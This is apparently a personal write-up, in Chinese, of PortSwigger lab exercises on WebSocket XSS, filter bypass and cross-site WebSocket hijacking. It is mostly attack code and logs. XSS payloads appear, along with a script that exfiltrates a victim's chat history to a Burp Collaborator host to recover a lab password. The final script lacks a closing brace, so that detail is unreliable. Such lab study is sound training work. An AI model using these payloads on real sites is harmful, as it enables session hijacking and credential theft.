# WebSockets

## [Lab: Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
### 題目敘述
 This online shop has a live chat feature implemented using WebSockets.

Chat messages that you submit are viewed by a support agent in real time.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 
### 題目解釋
練習用 Burp 抓 Websockets

### 解答
用 Burp 抓包後，上面有一個 Websockets history

把資料丟到 Repeater 之後改輸入 

```
{"user":"You","content":" <img src=1 onerror='alert(1)'>"}
```


## [Lab: Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
### 題目敘述
 This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 
### 題目解釋
IP 被 Ban 可以改 `X-Forwarded-For`


### 解答
把 `X-Forwarded-For` 改掉後，送

```
{"user":"You","content":"<img src=1 oNeRrOr=alert`1`>"}
```

## [Lab: Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
### 題目敘述
 This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account. 

### 題目解釋
用 CSRF 的方法來偷資料，需要自己寫 JS

### 解答
觀察只送 READY 到 Server，Server 就會吐一堆東西回來

接下來來練習寫 Socket 的 js

可以參考[這邊](https://developer.mozilla.org/zh-TW/docs/Web/API/WebSockets_API/Writing_WebSocket_client_applications)，或是原始題目的 js 檔案


自己隨便寫一下，只要連上就會噴 READY，然後把收到的東西 console.log 吐出來，在本地測
```html
<script>
    var mySocket = new WebSocket("wss://acef1f681ef2dfc8c0f24599001000f5.web-security-academy.net/chat");
    mySocket.onopen = function (evt) {
        mySocket.send("READY")
    }
    mySocket.onmessage = function (evt) {
        var message = evt.data;
        console.log(message);
    };
</script>
```

接下來要試著把東西傳出去

```html
<script>
    var mySocket = new WebSocket("wss://acef1f681ef2dfc8c0f24599001000f5.web-security-academy.net/chat");
    mySocket.onopen = function (evt) {
        mySocket.send("READY")
    }
    mySocket.onmessage = function (evt) {
        var message = evt.data;
        fetch("http://127.0.0.1:9453/?data="+btoa(message));
    };
</script>
```

本地開一個 `python3 -m http.server 9453`

可以順利收到
```
python3 -m http.server 9453
Serving HTTP on 0.0.0.0 port 9453 (http://0.0.0.0:9453/) ...
127.0.0.1 - - [08/Feb/2022 05:16:35] "GET /?data=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IjEyMyJ9 HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:35] "GET /?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ikkgc3dlYXIsIHlvdXIgY2hpbGRyZW4gYXJlIHNtYXJ0ZXIgdGhhbiB5b3UifQ== HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:35] "GET /?data=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IjEyMzMzIn0= HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:35] "GET /?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IllvdSZhcG9zO3JlIGdvaW5nIHRvIGxvc2UgeW91ciB2b2ljZSBhc2tpbmcgbWUgc2lsbHkgcXVlc3Rpb25zLiJ9 HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:35] "GET /?data=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:51] "GET /?data=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IjEyMyJ9 HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:51] "GET /?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ikkgc3dlYXIsIHlvdXIgY2hpbGRyZW4gYXJlIHNtYXJ0ZXIgdGhhbiB5b3UifQ== HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:51] "GET /?data=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IjEyMzMzIn0= HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:51] "GET /?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IllvdSZhcG9zO3JlIGdvaW5nIHRvIGxvc2UgeW91ciB2b2ljZSBhc2tpbmcgbWUgc2lsbHkgcXVlc3Rpb25zLiJ9 HTTP/1.1" 200 -
127.0.0.1 - - [08/Feb/2022 05:16:51] "GET /?data=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 -
```


接下來改用 Burp 的 Collaborator client


```html
<script>
    var mySocket = new WebSocket("wss://acef1f681ef2dfc8c0f24599001000f5.web-security-academy.net/chat");
    mySocket.onopen = function (evt) {
        mySocket.send("READY")
    }
    mySocket.onmessage = function (evt) {
        var message = evt.data;
        // fetch("http://127.0.0.1:9453/?data="+btoa(message));
        fetch("http://bjyehipobfcu6padzo785h4pug07ow.burpcollaborator.net/?data="+btoa(message));
    };
</script>

```

本地測試 OK，丟到 Exploit Server 上

發現了一些 CORS 之類的問題，最後修改，可以用 img src 來繞

```html
<script>
    var mySocket = new WebSocket("wss://acef1f681ef2dfc8c0f24599001000f5.web-security-academy.net/chat");
    mySocket.onopen = function (evt) {
        mySocket.send("READY")
    }
    mySocket.onmessage = function (evt) {
        var message = evt.data;
        document.body.innerHTML = "<img src='https://bjyehipobfcu6padzo785h4pug07ow.burpcollaborator.net/?data="+btoa(message)+"'>"
</script>

<body>
    meow
</body>
```

最後順利收到訊息

```
GET /?data=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3Mga3dnNDlzbTJvMWF2czZobm4xcWsifQ== HTTP/1.1

{"user":"Hal Pline","content":"No problem carlos, it&apos;s kwg49sm2o1avs6hnn1qk"}
```

使用帳密登入 `carlos` / `kwg49sm2o1avs6hnn1qk` 即可過關